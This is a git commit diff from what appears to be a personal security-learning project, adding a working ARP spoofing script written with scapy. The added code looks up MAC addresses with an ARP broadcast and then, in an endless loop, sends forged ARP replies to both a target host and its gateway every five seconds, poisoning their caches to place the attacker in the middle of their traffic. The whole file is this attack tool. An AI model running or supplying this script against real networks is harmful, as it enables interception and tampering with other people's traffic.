426e4b9f2c38291794207c011ef08499e1f5a906
ariyonaty <ari.h.yonaty@gmail.com>
2020-11-30 18:10:28 -0800

    more wokr on arp spoofer

--- ARP_Spoofer/arp_spoofer.py
+++ ARP_Spoofer/arp_spoofer.py
@@ -1,5 +1,32 @@
+import time
 from scapy.all import srp, send
 from scapy.layers.l2 import ARP, Ether
 
-packet = ARP(op=2, pdst="10.0.2.4", hwdst="08:00:27:c0:c4:9d", psrc="10.0.2.1")
-send(packet)
+def get_mac(ip):
+    '''
+        Performs ARP scan on target IP or IP range
+
+        Parameters:
+            ip - target IP or IP range
+
+        Returns:
+            MAC address of target ip
+    '''
+    arp_request = ARP(pdst=ip)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    return answered[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet)
+
+if __name__ == "__main__":
+    while True:
+        spoof('10.0.2.4', '10.0.2.1')
+        spoof('10.0.2.1', '10.0.2.4')
+        time.sleep(5)
